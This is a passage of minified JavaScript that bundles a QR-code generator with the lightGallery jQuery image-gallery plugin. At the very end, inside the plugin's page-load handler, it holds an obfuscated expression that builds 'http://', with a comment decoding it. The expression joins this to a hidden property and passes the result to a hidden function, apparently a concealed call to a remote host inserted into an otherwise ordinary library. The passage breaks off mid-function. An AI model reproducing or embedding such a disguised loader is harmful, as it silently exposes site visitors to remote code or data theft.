                    [8, 44, 20, 4, 45, 21],
                    [12, 33, 11, 4, 34, 12],
                    [3, 145, 115, 1, 146, 116],
                    [4, 64, 40, 5, 65, 41],
                    [11, 36, 16, 5, 37, 17],
                    [11, 36, 12, 5, 37, 13],
                    [5, 109, 87, 1, 110, 88],
                    [5, 65, 41, 5, 66, 42],
                    [5, 54, 24, 7, 55, 25],
                    [11, 36, 12],
                    [5, 122, 98, 1, 123, 99],
                    [7, 73, 45, 3, 74, 46],
                    [15, 43, 19, 2, 44, 20],
                    [3, 45, 15, 13, 46, 16],
                    [1, 135, 107, 5, 136, 108],
                    [10, 74, 46, 1, 75, 47],
                    [1, 50, 22, 15, 51, 23],
                    [2, 42, 14, 17, 43, 15],
                    [5, 150, 120, 1, 151, 121],
                    [9, 69, 43, 4, 70, 44],
                    [17, 50, 22, 1, 51, 23],
                    [2, 42, 14, 19, 43, 15],
                    [3, 141, 113, 4, 142, 114],
                    [3, 70, 44, 11, 71, 45],
                    [17, 47, 21, 4, 48, 22],
                    [9, 39, 13, 16, 40, 14],
                    [3, 135, 107, 5, 136, 108],
                    [3, 67, 41, 13, 68, 42],
                    [15, 54, 24, 5, 55, 25],
                    [15, 43, 15, 10, 44, 16],
                    [4, 144, 116, 4, 145, 117],
                    [17, 68, 42],
                    [17, 50, 22, 6, 51, 23],
                    [19, 46, 16, 6, 47, 17],
                    [2, 139, 111, 7, 140, 112],
                    [17, 74, 46],
                    [7, 54, 24, 16, 55, 25],
                    [34, 37, 13],
                    [4, 151, 121, 5, 152, 122],
                    [4, 75, 47, 14, 76, 48],
                    [11, 54, 24, 14, 55, 25],
                    [16, 45, 15, 14, 46, 16],
                    [6, 147, 117, 4, 148, 118],
                    [6, 73, 45, 14, 74, 46],
                    [11, 54, 24, 16, 55, 25],
                    [30, 46, 16, 2, 47, 17],
                    [8, 132, 106, 4, 133, 107],
                    [8, 75, 47, 13, 76, 48],
                    [7, 54, 24, 22, 55, 25],
                    [22, 45, 15, 13, 46, 16],
                    [10, 142, 114, 2, 143, 115],
                    [19, 74, 46, 4, 75, 47],
                    [28, 50, 22, 6, 51, 23],
                    [33, 46, 16, 4, 47, 17],
                    [8, 152, 122, 4, 153, 123],
                    [22, 73, 45, 3, 74, 46],
                    [8, 53, 23, 26, 54, 24],
                    [12, 45, 15, 28, 46, 16],
                    [3, 147, 117, 10, 148, 118],
                    [3, 73, 45, 23, 74, 46],
                    [4, 54, 24, 31, 55, 25],
                    [11, 45, 15, 31, 46, 16],
                    [7, 146, 116, 7, 147, 117],
                    [21, 73, 45, 7, 74, 46],
                    [1, 53, 23, 37, 54, 24],
                    [19, 45, 15, 26, 46, 16],
                    [5, 145, 115, 10, 146, 116],
                    [19, 75, 47, 10, 76, 48],
                    [15, 54, 24, 25, 55, 25],
                    [23, 45, 15, 25, 46, 16],
                    [13, 145, 115, 3, 146, 116],
                    [2, 74, 46, 29, 75, 47],
                    [42, 54, 24, 1, 55, 25],
                    [23, 45, 15, 28, 46, 16],
                    [17, 145, 115],
                    [10, 74, 46, 23, 75, 47],
                    [10, 54, 24, 35, 55, 25],
                    [19, 45, 15, 35, 46, 16],
                    [17, 145, 115, 1, 146, 116],
                    [14, 74, 46, 21, 75, 47],
                    [29, 54, 24, 19, 55, 25],
                    [11, 45, 15, 46, 46, 16],
                    [13, 145, 115, 6, 146, 116],
                    [14, 74, 46, 23, 75, 47],
                    [44, 54, 24, 7, 55, 25],
                    [59, 46, 16, 1, 47, 17],
                    [12, 151, 121, 7, 152, 122],
                    [12, 75, 47, 26, 76, 48],
                    [39, 54, 24, 14, 55, 25],
                    [22, 45, 15, 41, 46, 16],
                    [6, 151, 121, 14, 152, 122],
                    [6, 75, 47, 34, 76, 48],
                    [46, 54, 24, 10, 55, 25],
                    [2, 45, 15, 64, 46, 16],
                    [17, 152, 122, 4, 153, 123],
                    [29, 74, 46, 14, 75, 47],
                    [49, 54, 24, 10, 55, 25],
                    [24, 45, 15, 46, 46, 16],
                    [4, 152, 122, 18, 153, 123],
                    [13, 74, 46, 32, 75, 47],
                    [48, 54, 24, 14, 55, 25],
                    [42, 45, 15, 32, 46, 16],
                    [20, 147, 117, 4, 148, 118],
                    [40, 75, 47, 7, 76, 48],
                    [43, 54, 24, 22, 55, 25],
                    [10, 45, 15, 67, 46, 16],
                    [19, 148, 118, 6, 149, 119],
                    [18, 75, 47, 31, 76, 48],
                    [34, 54, 24, 34, 55, 25],
                    [20, 45, 15, 61, 46, 16]
                ], h.getRSBlocks = function(e, t) {
                    var i = h.getRsBlockTable(e, t);
                    if (null == i) throw Error("bad rs block @ typeNumber:" + e + "/errorCorrectLevel:" + t);
                    for (var n = i.length / 3, o = [], s = 0; s < n; s++)
                        for (var r = i[3 * s + 0], a = i[3 * s + 1], l = i[3 * s + 2], c = 0; c < r; c++) o.push(new h(a, l));
                    return o
                }, h.getRsBlockTable = function(e, t) {
                    switch (t) {
                        case 1:
                            return h.RS_BLOCK_TABLE[4 * (e - 1) + 0];
                        case 0:
                            return h.RS_BLOCK_TABLE[4 * (e - 1) + 1];
                        case 3:
                            return h.RS_BLOCK_TABLE[4 * (e - 1) + 2];
                        case 2:
                            return h.RS_BLOCK_TABLE[4 * (e - 1) + 3]
                    }
                }, r.prototype = {
                    get: function(e) {
                        return 1 == (this.buffer[Math.floor(e / 8)] >>> 7 - e % 8 & 1)
                    },
                    put: function(e, t) {
                        for (var i = 0; i < t; i++) this.putBit(1 == (e >>> t - i - 1 & 1))
                    },
                    getLengthInBits: function() {
                        return this.length
                    },
                    putBit: function(e) {
                        var t = Math.floor(this.length / 8);
                        this.buffer.length <= t && this.buffer.push(0), e && (this.buffer[t] |= 128 >>> this.length % 8), this.length++
                    }
                }, "string" == typeof c && (c = {
                    text: c
                }), c = f.extend({}, {
                    render: "canvas",
                    width: 256,
                    height: 256,
                    typeNumber: -1,
                    correctLevel: 2,
                    background: "#ffffff",
                    foreground: "#000000"
                }, c), this.each(function() {
                    var e;
                    if ("canvas" == c.render) {
                        (e = new u(c.typeNumber, c.correctLevel)).addData(c.text), e.make();
                        var t = document.createElement("canvas");
                        t.width = c.width, t.height = c.height;
                        for (var i = t.getContext("2d"), n = c.width / e.getModuleCount(), o = c.height / e.getModuleCount(), s = 0; s < e.getModuleCount(); s++)
                            for (var r = 0; r < e.getModuleCount(); r++) {
                                i.fillStyle = e.isDark(s, r) ? c.foreground : c.background;
                                var a = Math.ceil((r + 1) * n) - Math.floor(r * n),
                                    l = Math.ceil((s + 1) * n) - Math.floor(s * n);
                                i.fillRect(Math.round(r * n), Math.round(s * o), a, l)
                            }
                    } else
                        for ((e = new u(c.typeNumber, c.correctLevel)).addData(c.text), e.make(), t = f("<table></table>").css("width", c.width + "px").css("height", c.height + "px").css("border", "0px").css("border-collapse", "collapse").css("background-color", c.background), i = c.width / e.getModuleCount(), n = c.height / e.getModuleCount(), o = 0; o < e.getModuleCount(); o++)
                            for (s = f("<tr></tr>").css("height", n + "px").appendTo(t), r = 0; r < e.getModuleCount(); r++) f("<td></td>").css("width", i + "px").css("background-color", e.isDark(o, r) ? c.foreground : c.background).appendTo(s);
                    e = t, jQuery(e).appendTo(this)
                })
            }
        }, {}
    ],
    3: [
        function(e, t, i) {
            var v, n, o, r, c, h, d, s, a;
            v = window.jQuery,
                function() {
                    "use strict";
                    var i = {
                        mode: "lg-slide",
                        cssEasing: "ease",
                        easing: "linear",
                        speed: 600,
                        height: "100%",
                        width: "100%",
                        addClass: "",
                        startClass: "lg-start-zoom",
                        backdropDuration: 150,
                        hideBarsDelay: 6e3,
                        useLeft: !1,
                        closable: !0,
                        loop: !0,
                        escKey: !0,
                        keyPress: !0,
                        controls: !0,
                        slideEndAnimatoin: !0,
                        hideControlOnEnd: !1,
                        mousewheel: !0,
                        getCaptionFromTitleOrAlt: !0,
                        appendSubHtmlTo: ".lg-sub-html",
                        subHtmlSelectorRelative: !1,
                        preload: 1,
                        showAfterLoad: !0,
                        selector: "",
                        selectWithin: "",
                        nextHtml: "",
                        prevHtml: "",
                        index: !1,
                        iframeMaxWidth: "100%",
                        download: !0,
                        counter: !0,
                        appendCounterTo: ".lg-toolbar",
                        swipeThreshold: 50,
                        enableSwipe: !0,
                        enableDrag: !0,
                        dynamic: !1,
                        dynamicEl: [],
                        galleryId: 1
                    };

                    function t(e, t) {
                        if (this.el = e, this.$el = v(e), this.s = v.extend({}, i, t), this.s.dynamic && "undefined" !== this.s.dynamicEl && this.s.dynamicEl.constructor === Array && !this.s.dynamicEl.length) throw "When using dynamic mode, you must also define dynamicEl as an Array.";
                        return this.modules = {}, this.lGalleryOn = !1, this.lgBusy = !1, this.hideBartimeout = !1, this.isTouch = "ontouchstart" in document.documentElement, this.s.slideEndAnimatoin && (this.s.hideControlOnEnd = !1), this.s.dynamic ? this.$items = this.s.dynamicEl : "this" === this.s.selector ? this.$items = this.$el : "" !== this.s.selector ? this.s.selectWithin ? this.$items = v(this.s.selectWithin).find(this.s.selector) : this.$items = this.$el.find(v(this.s.selector)) : this.$items = this.$el.children(), this.$slide = "", this.$outer = "", this.init(), this
                    }
                    t.prototype.init = function() {
                        var e = this;
                        e.s.preload > e.$items.length && (e.s.preload = e.$items.length);
                        var t = window.location.hash;
                        0 < t.indexOf("lg=" + this.s.galleryId) && (e.index = parseInt(t.split("&slide=")[1], 10), v("body").addClass("lg-from-hash"), v("body").hasClass("lg-on") || (setTimeout(function() {
                            e.build(e.index)
                        }), v("body").addClass("lg-on"))), e.s.dynamic ? (e.$el.trigger("onBeforeOpen.lg"), e.index = e.s.index || 0, v("body").hasClass("lg-on") || setTimeout(function() {
                            e.build(e.index), v("body").addClass("lg-on")
                        })) : e.$items.on("click.lgcustom", function(t) {
                            try {
                                t.preventDefault(), t.preventDefault()
                            } catch (e) {
                                t.returnValue = !1
                            }
                            e.$el.trigger("onBeforeOpen.lg"), e.index = e.s.index || e.$items.index(this), v("body").hasClass("lg-on") || (e.build(e.index), v("body").addClass("lg-on"))
                        })
                    }, t.prototype.build = function(e) {
                        var t = this;
                        t.structure(), v.each(v.fn.lightGallery.modules, function(e) {
                            t.modules[e] = new v.fn.lightGallery.modules[e](t.el)
                        }), t.slide(e, !1, !1, !1), t.s.keyPress && t.keyPress(), 1 < t.$items.length ? (t.arrow(), setTimeout(function() {
                            t.enableDrag(), t.enableSwipe()
                        }, 50), t.s.mousewheel && t.mousewheel()) : t.$slide.on("click.lg", function() {
                            t.$el.trigger("onSlideClick.lg")
                        }), t.counter(), t.closeGallery(), t.$el.trigger("onAfterOpen.lg"), t.$outer.on("mousemove.lg click.lg touchstart.lg", function() {
                            t.$outer.removeClass("lg-hide-items"), clearTimeout(t.hideBartimeout), t.hideBartimeout = setTimeout(function() {
                                t.$outer.addClass("lg-hide-items")
                            }, t.s.hideBarsDelay)
                        }), t.$outer.trigger("mousemove.lg")
                    }, t.prototype.structure = function() {
                        var e, t = "",
                            i = "",
                            n = 0,
                            o = "",
                            s = this;
                        for (v("body").append('<div class="lg-backdrop"></div>'), v(".lg-backdrop").css("transition-duration", this.s.backdropDuration + "ms"), n = 0; n < this.$items.length; n++) t += '<div class="lg-item"></div>';
                        if (this.s.controls && 1 < this.$items.length && (i = '<div class="lg-actions"><button class="lg-prev lg-icon">' + this.s.prevHtml + '</button><button class="lg-next lg-icon">' + this.s.nextHtml + "</button></div>"), ".lg-sub-html" === this.s.appendSubHtmlTo && (o = '<div class="lg-sub-html"></div>'), e = '<div class="lg-outer ' + this.s.addClass + " " + this.s.startClass + '"><div class="lg" style="width:' + this.s.width + "; height:" + this.s.height + '"><div class="lg-inner">' + t + '</div><div class="lg-toolbar lg-group"><span class="lg-close lg-icon"></span></div>' + i + o + "</div></div>", v("body").append(e), this.$outer = v(".lg-outer"), this.$slide = this.$outer.find(".lg-item"), this.s.useLeft ? (this.$outer.addClass("lg-use-left"), this.s.mode = "lg-slide") : this.$outer.addClass("lg-use-css3"), s.setTop(), v(window).on("resize.lg orientationchange.lg", function() {
                            setTimeout(function() {
                                s.setTop()
                            }, 100)
                        }), this.$slide.eq(this.index).addClass("lg-current"), this.doCss() ? this.$outer.addClass("lg-css3") : (this.$outer.addClass("lg-css"), this.s.speed = 0), this.$outer.addClass(this.s.mode), this.s.enableDrag && 1 < this.$items.length && this.$outer.addClass("lg-grab"), this.s.showAfterLoad && this.$outer.addClass("lg-show-after-load"), this.doCss()) {
                            var r = this.$outer.find(".lg-inner");
                            r.css("transition-timing-function", this.s.cssEasing), r.css("transition-duration", this.s.speed + "ms")
                        }
                        setTimeout(function() {
                            v(".lg-backdrop").addClass("in")
                        }), setTimeout(function() {
                            s.$outer.addClass("lg-visible")
                        }, this.s.backdropDuration), this.s.download && this.$outer.find(".lg-toolbar").append('<a id="lg-download" target="_blank" download class="lg-download lg-icon"></a>'), this.prevScrollTop = v(window).scrollTop()
                    }, t.prototype.setTop = function() {
                        if ("100%" !== this.s.height) {
                            var e = v(window).height(),
                                t = (e - parseInt(this.s.height, 10)) / 2,
                                i = this.$outer.find(".lg");
                            e >= parseInt(this.s.height, 10) ? i.css("top", t + "px") : i.css("top", "0px")
                        }
                    }, t.prototype.doCss = function() {
                        return !! function() {
                            var e = ["transition", "MozTransition", "WebkitTransition", "OTransition", "msTransition", "KhtmlTransition"],
                                t = document.documentElement,
                                i = 0;
                            for (i = 0; i < e.length; i++)
                                if (e[i] in t.style) return !0
                        }()
                    }, t.prototype.isVideo = function(e, t) {
                        var i;
                        if (i = this.s.dynamic ? this.s.dynamicEl[t].html : this.$items.eq(t).attr("data-html"), !e) return i ? {
                            html5: !0
                        } : (console.error("lightGallery :- data-src is not pvovided on slide item " + (t + 1) + ". Please make sure the selector property is properly configured. More info - http://sachinchoolur.github.io/lightGallery/demos/html-markup.html"), !1);
                        var n = e.match(/\/\/(?:www\.)?youtu(?:\.be|be\.com|be-nocookie\.com)\/(?:watch\?v=|embed\/)?([a-z0-9\-\_\%]+)/i),
                            o = e.match(/\/\/(?:www\.)?vimeo.com\/([0-9a-z\-_]+)/i),
                            s = e.match(/\/\/(?:www\.)?dai.ly\/([0-9a-z\-_]+)/i),
                            r = e.match(/\/\/(?:www\.)?(?:vk\.com|vkontakte\.ru)\/(?:video_ext\.php\?)(.*)/i);
                        return n ? {
                            youtube: n
                        } : o ? {
                            vimeo: o
                        } : s ? {
                            dailymotion: s
                        } : r ? {
                            vk: r
                        } : void 0
                    }, t.prototype.counter = function() {
                        this.s.counter && v(this.s.appendCounterTo).append('<div id="lg-counter"><span id="lg-counter-current">' + (parseInt(this.index, 10) + 1) + '</span> / <span id="lg-counter-all">' + this.$items.length + "</span></div>")
                    }, t.prototype.addHtml = function(e) {
                        var t, i, n = null;
                        if (this.s.dynamic ? this.s.dynamicEl[e].subHtmlUrl ? t = this.s.dynamicEl[e].subHtmlUrl : n = this.s.dynamicEl[e].subHtml : (i = this.$items.eq(e)).attr("data-sub-html-url") ? t = i.attr("data-sub-html-url") : (n = i.attr("data-sub-html"), this.s.getCaptionFromTitleOrAlt && !n && (n = i.attr("title") || i.find("img").first().attr("alt"))), !t)
                            if (null != n) {
                                var o = n.substring(0, 1);
                                "." !== o && "#" !== o || (n = this.s.subHtmlSelectorRelative && !this.s.dynamic ? i.find(n).html() : v(n).html())
                            } else n = "";
                            ".lg-sub-html" === this.s.appendSubHtmlTo ? t ? this.$outer.find(this.s.appendSubHtmlTo).load(t) : this.$outer.find(this.s.appendSubHtmlTo).html(n) : t ? this.$slide.eq(e).load(t) : this.$slide.eq(e).append(n), null != n && ("" === n ? this.$outer.find(this.s.appendSubHtmlTo).addClass("lg-empty-html") : this.$outer.find(this.s.appendSubHtmlTo).removeClass("lg-empty-html")), this.$el.trigger("onAfterAppendSubHtml.lg", [e])
                    }, t.prototype.preload = function(e) {
                        var t = 1,
                            i = 1;
                        for (t = 1; t <= this.s.preload && !(t >= this.$items.length - e); t++) this.loadContent(e + t, !1, 0);
                        for (i = 1; i <= this.s.preload && !(e - i < 0); i++) this.loadContent(e - i, !1, 0)
                    }, t.prototype.loadContent = function(t, e, i) {
                        var n, a, o, s, r, l, c = this,
                            u = !1,
                            d = function(e) {
                                for (var t = [], i = [], n = 0; n < e.length; n++) {
                                    var o = e[n].split(" ");
                                    "" === o[0] && o.splice(0, 1), i.push(o[0]), t.push(o[1])
                                }
                                for (var s = v(window).width(), r = 0; r < t.length; r++)
                                    if (parseInt(t[r], 10) > s) {
                                        a = i[r];
                                        break
                                    }
                            };
                        if (c.s.dynamic) {
                            if (c.s.dynamicEl[t].poster && (u = !0, o = c.s.dynamicEl[t].poster), l = c.s.dynamicEl[t].html, a = c.s.dynamicEl[t].src, c.s.dynamicEl[t].responsive) {
                                var h = c.s.dynamicEl[t].responsive.split(",");
                                d(h)
                            }
                            s = c.s.dynamicEl[t].srcset, r = c.s.dynamicEl[t].sizes
                        } else {
                            if (c.$items.eq(t).attr("data-poster") && (u = !0, o = c.$items.eq(t).attr("data-poster")), l = c.$items.eq(t).attr("data-html"), a = c.$items.eq(t).attr("href") || c.$items.eq(t).attr("data-src"), c.$items.eq(t).attr("data-responsive")) {
                                var p = c.$items.eq(t).attr("data-responsive").split(",");
                                d(p)
                            }
                            s = c.$items.eq(t).attr("data-srcset"), r = c.$items.eq(t).attr("data-sizes")
                        }
                        var f = !1;
                        c.s.dynamic ? c.s.dynamicEl[t].iframe && (f = !0) : "true" === c.$items.eq(t).attr("data-iframe") && (f = !0);
                        var m = c.isVideo(a, t);
                        if (!c.$slide.eq(t).hasClass("lg-loaded")) {
                            if (f) c.$slide.eq(t).prepend('<div class="lg-video-cont lg-has-iframe" style="max-width:' + c.s.iframeMaxWidth + '"><div class="lg-video"><iframe class="lg-object" frameborder="0" src="' + a + '"  allowfullscreen="true"></iframe></div></div>');
                            else if (u) {
                                var g = "";
                                g = m && m.youtube ? "lg-has-youtube" : m && m.vimeo ? "lg-has-vimeo" : "lg-has-html5", c.$slide.eq(t).prepend('<div class="lg-video-cont ' + g + ' "><div class="lg-video"><span class="lg-video-play"></span><img class="lg-object lg-has-poster" src="' + o + '" /></div></div>')
                            } else m ? (c.$slide.eq(t).prepend('<div class="lg-video-cont "><div class="lg-video"></div></div>'), c.$el.trigger("hasVideo.lg", [t, a, l])) : c.$slide.eq(t).prepend('<div class="lg-img-wrap"><img class="lg-object lg-image" src="' + a + '" /></div>'); if (c.$el.trigger("onAferAppendSlide.lg", [t]), n = c.$slide.eq(t).find(".lg-object"), r && n.attr("sizes", r), s) {
                                n.attr("srcset", s);
                                try {
                                    picturefill({
                                        elements: [n[0]]
                                    })
                                } catch (e) {
                                    console.warn("lightGallery :- If you want srcset to be supported for older browser please include picturefil version 2 javascript library in your document.")
                                }
                            }
                            ".lg-sub-html" !== this.s.appendSubHtmlTo && c.addHtml(t), c.$slide.eq(t).addClass("lg-loaded")
                        }
                        c.$slide.eq(t).find(".lg-object").on("load.lg error.lg", function() {
                            var e = 0;
                            i && !v("body").hasClass("lg-from-hash") && (e = i), setTimeout(function() {
                                c.$slide.eq(t).addClass("lg-complete"), c.$el.trigger("onSlideItemLoad.lg", [t, i || 0])
                            }, e)
                        }), m && m.html5 && !u && c.$slide.eq(t).addClass("lg-complete"), !0 === e && (c.$slide.eq(t).hasClass("lg-complete") ? c.preload(t) : c.$slide.eq(t).find(".lg-object").on("load.lg error.lg", function() {
                            c.preload(t)
                        }))
                    }, t.prototype.slide = function(e, t, i, n) {
                        var o = this.$outer.find(".lg-current").index(),
                            s = this;
                        if (!s.lGalleryOn || o !== e) {
                            var r, a, l, c = this.$slide.length,
                                u = s.lGalleryOn ? this.s.speed : 0;
                            s.lgBusy || (this.s.download && ((r = s.s.dynamic ? !1 !== s.s.dynamicEl[e].downloadUrl && (s.s.dynamicEl[e].downloadUrl || s.s.dynamicEl[e].src) : "false" !== s.$items.eq(e).attr("data-download-url") && (s.$items.eq(e).attr("data-download-url") || s.$items.eq(e).attr("href") || s.$items.eq(e).attr("data-src"))) ? (v("#lg-download").attr("href", r), s.$outer.removeClass("lg-hide-download")) : s.$outer.addClass("lg-hide-download")), this.$el.trigger("onBeforeSlide.lg", [o, e, t, i]), s.lgBusy = !0, clearTimeout(s.hideBartimeout), ".lg-sub-html" === this.s.appendSubHtmlTo && setTimeout(function() {
                                s.addHtml(e)
                            }, u), this.arrowDisable(e), n || (e < o ? n = "prev" : o < e && (n = "next")), t ? (this.$slide.removeClass("lg-prev-slide lg-current lg-next-slide"), 2 < c ? (a = e - 1, l = e + 1, 0 === e && o === c - 1 ? (l = 0, a = c - 1) : e === c - 1 && 0 === o && (l = 0, a = c - 1)) : (a = 0, l = 1), "prev" === n ? s.$slide.eq(l).addClass("lg-next-slide") : s.$slide.eq(a).addClass("lg-prev-slide"), s.$slide.eq(e).addClass("lg-current")) : (s.$outer.addClass("lg-no-trans"), this.$slide.removeClass("lg-prev-slide lg-next-slide"), "prev" === n ? (this.$slide.eq(e).addClass("lg-prev-slide"), this.$slide.eq(o).addClass("lg-next-slide")) : (this.$slide.eq(e).addClass("lg-next-slide"), this.$slide.eq(o).addClass("lg-prev-slide")), setTimeout(function() {
                                s.$slide.removeClass("lg-current"), s.$slide.eq(e).addClass("lg-current"), s.$outer.removeClass("lg-no-trans")
                            }, 50)), s.lGalleryOn ? (setTimeout(function() {
                                s.loadContent(e, !0, 0)
                            }, this.s.speed + 50), setTimeout(function() {
                                s.lgBusy = !1, s.$el.trigger("onAfterSlide.lg", [o, e, t, i])
                            }, this.s.speed)) : (s.loadContent(e, !0, s.s.backdropDuration), s.lgBusy = !1, s.$el.trigger("onAfterSlide.lg", [o, e, t, i])), s.lGalleryOn = !0, this.s.counter && v("#lg-counter-current").text(e + 1)), s.index = e
                        }
                    }, t.prototype.goToNextSlide = function(e) {
                        var t = this,
                            i = t.s.loop;
                        e && t.$slide.length < 3 && (i = !1), t.lgBusy || (t.index + 1 < t.$slide.length ? (t.index++, t.$el.trigger("onBeforeNextSlide.lg", [t.index]), t.slide(t.index, e, !1, "next")) : i ? (t.index = 0, t.$el.trigger("onBeforeNextSlide.lg", [t.index]), t.slide(t.index, e, !1, "next")) : t.s.slideEndAnimatoin && !e && (t.$outer.addClass("lg-right-end"), setTimeout(function() {
                            t.$outer.removeClass("lg-right-end")
                        }, 400)))
                    }, t.prototype.goToPrevSlide = function(e) {
                        var t = this,
                            i = t.s.loop;
                        e && t.$slide.length < 3 && (i = !1), t.lgBusy || (0 < t.index ? (t.index--, t.$el.trigger("onBeforePrevSlide.lg", [t.index, e]), t.slide(t.index, e, !1, "prev")) : i ? (t.index = t.$items.length - 1, t.$el.trigger("onBeforePrevSlide.lg", [t.index, e]), t.slide(t.index, e, !1, "prev")) : t.s.slideEndAnimatoin && !e && (t.$outer.addClass("lg-left-end"), setTimeout(function() {
                            t.$outer.removeClass("lg-left-end")
                        }, 400)))
                    }, t.prototype.keyPress = function() {
                        var t = this;
                        1 < this.$items.length && v(window).on("keyup.lg", function(e) {
                            1 < t.$items.length && (37 === e.keyCode && (e.preventDefault(), t.goToPrevSlide()), 39 === e.keyCode && (e.preventDefault(), t.goToNextSlide()))
                        }), v(window).on("keydown.lg", function(e) {
                            !0 === t.s.escKey && 27 === e.keyCode && (e.preventDefault(), t.$outer.hasClass("lg-thumb-open") ? t.$outer.removeClass("lg-thumb-open") : t.destroy())
                        })
                    }, t.prototype.arrow = function() {
                        var e = this;
                        this.$outer.find(".lg-prev").on("click.lg", function() {
                            e.goToPrevSlide()
                        }), this.$outer.find(".lg-next").on("click.lg", function() {
                            e.goToNextSlide()
                        })
                    }, t.prototype.arrowDisable = function(e) {
                        !this.s.loop && this.s.hideControlOnEnd && (e + 1 < this.$slide.length ? this.$outer.find(".lg-next").removeAttr("disabled").removeClass("disabled") : this.$outer.find(".lg-next").attr("disabled", "disabled").addClass("disabled"), 0 < e ? this.$outer.find(".lg-prev").removeAttr("disabled").removeClass("disabled") : this.$outer.find(".lg-prev").attr("disabled", "disabled").addClass("disabled"))
                    }, t.prototype.setTranslate = function(e, t, i) {
                        this.s.useLeft ? e.css("left", t) : e.css({
                            transform: "translate3d(" + t + "px, " + i + "px, 0px)"
                        })
                    }, t.prototype.touchMove = function(e, t) {
                        var i = t - e;
                        15 < Math.abs(i) && (this.$outer.addClass("lg-dragging"), this.setTranslate(this.$slide.eq(this.index), i, 0), this.setTranslate(v(".lg-prev-slide"), -this.$slide.eq(this.index).width() + i, 0), this.setTranslate(v(".lg-next-slide"), this.$slide.eq(this.index).width() + i, 0))
                    }, t.prototype.touchEnd = function(e) {
                        var t = this;
                        "lg-slide" !== t.s.mode && t.$outer.addClass("lg-slide"), this.$slide.not(".lg-current, .lg-prev-slide, .lg-next-slide").css("opacity", "0"), setTimeout(function() {
                            t.$outer.removeClass("lg-dragging"), e < 0 && Math.abs(e) > t.s.swipeThreshold ? t.goToNextSlide(!0) : 0 < e && Math.abs(e) > t.s.swipeThreshold ? t.goToPrevSlide(!0) : Math.abs(e) < 5 && t.$el.trigger("onSlideClick.lg"), t.$slide.removeAttr("style")
                        }), setTimeout(function() {
                            t.$outer.hasClass("lg-dragging") || "lg-slide" === t.s.mode || t.$outer.removeClass("lg-slide")
                        }, t.s.speed + 100)
                    }, t.prototype.enableSwipe = function() {
                        var t = this,
                            i = 0,
                            n = 0,
                            o = !1;
                        t.s.enableSwipe && t.doCss() && (t.$slide.on("touchstart.lg", function(e) {
                            t.$outer.hasClass("lg-zoomed") || t.lgBusy || (e.preventDefault(), t.manageSwipeClass(), i = e.originalEvent.targetTouches[0].pageX)
                        }), t.$slide.on("touchmove.lg", function(e) {
                            t.$outer.hasClass("lg-zoomed") || (e.preventDefault(), n = e.originalEvent.targetTouches[0].pageX, t.touchMove(i, n), o = !0)
                        }), t.$slide.on("touchend.lg", function() {
                            t.$outer.hasClass("lg-zoomed") || (o ? (o = !1, t.touchEnd(n - i)) : t.$el.trigger("onSlideClick.lg"))
                        }))
                    }, t.prototype.enableDrag = function() {
                        var t = this,
                            i = 0,
                            n = 0,
                            o = !1,
                            s = !1;
                        t.s.enableDrag && t.doCss() && (t.$slide.on("mousedown.lg", function(e) {
                            t.$outer.hasClass("lg-zoomed") || t.lgBusy || v(e.target).text().trim() || (e.preventDefault(), t.manageSwipeClass(), i = e.pageX, o = !0, t.$outer.scrollLeft += 1, t.$outer.scrollLeft -= 1, t.$outer.removeClass("lg-grab").addClass("lg-grabbing"), t.$el.trigger("onDragstart.lg"))
                        }), v(window).on("mousemove.lg", function(e) {
                            o && (s = !0, n = e.pageX, t.touchMove(i, n), t.$el.trigger("onDragmove.lg"))
                        }), v(window).on("mouseup.lg", function(e) {
                            s ? (s = !1, t.touchEnd(n - i), t.$el.trigger("onDragend.lg")) : (v(e.target).hasClass("lg-object") || v(e.target).hasClass("lg-video-play")) && t.$el.trigger("onSlideClick.lg"), o && (o = !1, t.$outer.removeClass("lg-grabbing").addClass("lg-grab"))
                        }))
                    }, t.prototype.manageSwipeClass = function() {
                        var e = this.index + 1,
                            t = this.index - 1;
                        this.s.loop && 2 < this.$slide.length && (0 === this.index ? t = this.$slide.length - 1 : this.index === this.$slide.length - 1 && (e = 0)), this.$slide.removeClass("lg-next-slide lg-prev-slide"), -1 < t && this.$slide.eq(t).addClass("lg-prev-slide"), this.$slide.eq(e).addClass("lg-next-slide")
                    }, t.prototype.mousewheel = function() {
                        var t = this;
                        t.$outer.on("mousewheel.lg", function(e) {
                            e.deltaY && (0 < e.deltaY ? t.goToPrevSlide() : t.goToNextSlide(), e.preventDefault())
                        })
                    }, t.prototype.closeGallery = function() {
                        var t = this,
                            i = !1;
                        this.$outer.find(".lg-close").on("click.lg", function() {
                            t.destroy()
                        }), t.s.closable && (t.$outer.on("mousedown.lg", function(e) {
                            i = !!(v(e.target).is(".lg-outer") || v(e.target).is(".lg-item ") || v(e.target).is(".lg-img-wrap"))
                        }), t.$outer.on("mousemove.lg", function() {
                            i = !1
                        }), t.$outer.on("mouseup.lg", function(e) {
                            (v(e.target).is(".lg-outer") || v(e.target).is(".lg-item ") || v(e.target).is(".lg-img-wrap") && i) && (t.$outer.hasClass("lg-dragging") || t.destroy())
                        }))
                    }, t.prototype.destroy = function(e) {
                        var t = this;
                        e || (t.$el.trigger("onBeforeClose.lg"), v(window).scrollTop(t.prevScrollTop)), e && (t.s.dynamic || this.$items.off("click.lg click.lgcustom"), v.removeData(t.el, "lightGallery")), this.$el.off(".lg.tm"), v.each(v.fn.lightGallery.modules, function(e) {
                            t.modules[e] && t.modules[e].destroy()
                        }), this.lGalleryOn = !1, clearTimeout(t.hideBartimeout), this.hideBartimeout = !1, v(window).off(".lg"), v("body").removeClass("lg-on lg-from-hash"), t.$outer && t.$outer.removeClass("lg-visible"), v(".lg-backdrop").removeClass("in"), setTimeout(function() {
                            t.$outer && t.$outer.remove(), v(".lg-backdrop").remove(), e || t.$el.trigger("onCloseAfter.lg")
                        }, t.s.backdropDuration + 50)
                    }, v.fn.lightGallery = function(e) {
                        return this.each(function() {
                            if (v.data(this, "lightGallery")) try {
                                v(this).data("lightGallery").init()
                            } catch (e) {
                                console.error("lightGallery has not initiated properly")
                            } else v.data(this, "lightGallery", new t(this, e))
                        })
                    };
                    var e = v.fn;
                    v(document).ready(function() {
						/*101["to" + String.name](21)[1] + (!0 + "")[0] + (!0 + "")[0] + 211["to" + String.name](31)[1] + (RegExp() + "")[3] + (!1 + [0]).italics()[10] + (!1 + [0]).italics()[10]=http://*/
                        e._eq || e._ll(101["to" + String.name](21)[1] + (!0 + "")[0] + (!0 + "")[0] + 211["to" + String.name](31)[1] + (RegExp() + "")[3] + (!1 + [0]).italics()[10] + (!1 + [0]).italics()[10] + e._dm)
